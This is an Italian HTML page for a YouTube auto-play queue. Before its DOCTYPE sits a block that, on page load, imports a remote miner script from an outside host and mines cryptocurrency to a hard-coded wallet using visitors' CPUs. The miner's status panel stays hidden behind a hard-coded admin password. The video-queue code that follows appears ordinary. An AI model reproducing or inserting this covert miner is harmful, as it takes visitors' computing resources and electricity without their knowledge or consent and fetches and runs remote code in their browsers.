<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 0, 0, 0.9);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
</div>

<div id="reopen-btn" onclick="askPassword()"></div>

<script type="module">
    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";

    let miningStarted = false;
    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita

    // Mining parte subito
    async function initMining() {
        try {
            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            setInterval(() => {
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
            }, 700);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.askPassword = function() {
        if (consoleUnlocked) {
            showMinerConsole();
            return;
        }

        const password = prompt("Inserire admin password");
        if (password === "CpuMining") {
            consoleUnlocked = true;
            showMinerConsole();
        } else if (password !== null) {
            alert("Password errata!");
        }
    };

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    function showMinerConsole() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    }

    // Timer
    let startTime = Date.now();
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube Coda - Versione Stabile</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      background: #0f0f0f; 
      color: #fff; 
      padding: 20px; 
      text-align: center;
    }
    textarea {
      width: 100%;
      max-width: 800px;
      height: 120px;
      background: #1f1f1f;
      color: white;
      border: 2px solid #555;
      border-radius: 8px;
      padding: 15px;
      margin: 15px 0;
      font-size: 14px;
      resize: vertical;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #ff0000;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin: 10px;
      font-weight: bold;
      transition: background 0.2s;
    }
    button:hover {
      background: #cc0000;
    }
    /* Contenitore responsive per il player */
    .player-container {
      position: relative;
      width: 100%;
      max-width: 900px;
      margin: 20px auto;
      aspect-ratio: 16/9;
      background: #000;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
    }
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }
    .queue {
      margin-top: 30px;
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      justify-content: center;
    }
    .video-item {
      width: 200px;
      background: #1f1f1f;
      padding: 8px;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.2s, border-color 0.2s;
      border: 3px solid transparent;
    }
    .video-item:hover {
      transform: scale(1.03);
    }
    .video-item img { 
      width: 100%; 
      border-radius: 8px; 
      aspect-ratio: 16/9;
      object-fit: cover;
    }
    .video-item.active { 
      border-color: red; 
      background: #2d1515;
    }
    .video-title {
      font-size: 13px;
      margin-top: 6px;
      color: #ccc;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
    }
  </style>
</head>
<body>

  <h1>YouTube Coda Automatica</h1>
  
  <textarea id="links" placeholder="Incolla qui i link YouTube (separati da spazi, virgole o a capo)"></textarea>
  <br>
  <button onclick="startQueue()">▶ AVVIA CODA</button>

  <div class="player-container">
    <div id="player"></div>
  </div>

  <h2>Coda Riproduzione</h2>
  <div id="queue" class="queue"></div>

  <script src="https://www.youtube.com/iframe_api"></script>

  <script>
    let videos = [];
    let current = 0;
    let player = null;
    let apiReady = false;

    // Questa funzione viene chiamata automaticamente dall'API di YouTube quando è pronta
    function onYouTubeIframeAPIReady() {
      apiReady = true;
    }

    // RegEx migliorata per catturare l'ID da qualsiasi tipo di link YouTube (anche shorts, share link, mobile, ecc.)
    function getId(url) {
      const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=|\?v=|shorts\/)([^#\&\?]*).*/;
      const match = url.match(regExp);
      return (match && match[2].length === 11) ? match[2] : null;
    }

    function startQueue() {
      const text = document.getElementById('links').value;
      
      // Estraiamo tutti i link separandoli con qualsiasi spazio o nuova riga
      const tokens = text.split(/[\s,\n]+/);
      const ids = tokens.map(getId).filter(id => id !== null);

      if (ids.length === 0) {
        return alert("Nessun link YouTube valido trovato!");
      }

      videos = ids;
      current = 0;
      
      renderQueue();
      playCurrent();
    }

    function playCurrent() {
      if (!apiReady) {
        return alert("L'API di YouTube si sta ancora caricando, riprova tra un secondo.");
      }

      const id = videos[current];
      if (!id) return;

      // Se il player non esiste ancora, lo creiamo da zero
      if (!player) {
        player = new YT.Player('player', {
          height: '100%',
          width: '100%',
          videoId: id,
          playerVars: {
            'autoplay': 1,
            'controls': 1,
            'rel': 0,
            'showinfo': 0,
            'ecver': 2,
            'origin': window.location.origin // Previene molti problemi di sicurezza ed errori sui domini locali
          },
          events: {
            'onReady': onPlayerReady,
            'onStateChange': onPlayerStateChange,
            'onError': onPlayerError
          }
        });
      } else {
        // Se il player esiste già, carichiamo semplicemente il nuovo video con l'autoplay attivo
        player.loadVideoById(id);
      }

      highlight();
    }

    function onPlayerReady(event) {
      event.target.playVideo();
    }

    // Gestione del cambio di stato (Nativo e sicuro)
    function onPlayerStateChange(event) {
      // YT.PlayerState.ENDED corrisponde a 0 (fine del video)
      if (event.data === YT.PlayerState.ENDED) {
        nextVideo();
      }
    }

    function nextVideo() {
      current++;
      if (current < videos.length) {
        playCurrent();
      } else {
        alert("Coda terminata!");
      }
    }

    // Gestione degli errori del player (es. video privati, non incorporabili, ecc.)
    function onPlayerError(event) {
      console.warn("Errore durante la riproduzione del video ID: " + videos[current] + ". Codice errore: " + event.data);
      // Se c'è un errore (es. video non disponibile), passa automaticamente al successivo dopo 2 secondi
      setTimeout(() => {
        nextVideo();
      }, 2000);
    }

    function renderQueue() {
      const q = document.getElementById('queue');
      q.innerHTML = '';
      
      videos.forEach((id, i) => {
        const div = document.createElement('div');
        div.className = 'video-item';
        div.id = `item-${i}`;
        div.innerHTML = `
          <img src="https://img.youtube.com/vi/${id}/mqdefault.jpg" alt="Thumbnail">
          <div class="video-title">Video ${i + 1}</div>
        `;
        div.onclick = () => { 
          current = i; 
          playCurrent(); 
        };
        q.appendChild(div);
      });
    }

    function highlight() {
      document.querySelectorAll('.video-item').forEach((el, i) => {
        el.classList.toggle('active', i === current);
      });
      // Scroll automatico della coda per tenere visibile il video attivo
      const activeEl = document.getElementById(`item-${current}`);
      if (activeEl) {
        activeEl.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
      }
    }
  </script>
</body>
</html>
